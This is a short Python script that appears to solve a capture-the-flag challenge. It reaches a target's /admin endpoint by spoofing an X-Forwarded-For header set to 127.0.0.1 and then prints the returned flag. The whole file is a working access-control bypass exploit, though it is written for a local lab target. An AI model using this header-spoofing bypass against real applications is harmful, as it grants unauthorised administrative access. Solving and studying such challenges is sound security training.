
import requests, sys

def solve(base):
    url = base.rstrip('/') + '/admin'
    r = requests.get(url, headers={'X-Forwarded-For': '127.0.0.1'}, timeout=10)
    if r.status_code == 200 and 'flag' in r.json():
        print('[+] Got flag:', r.json()['flag'])
    else:
        print('[-] Failed:', r.status_code, r.text)

if __name__ == '__main__':
    base = sys.argv[1] if len(sys.argv) > 1 else 'http://127.0.0.1:31346'
    solve(base)
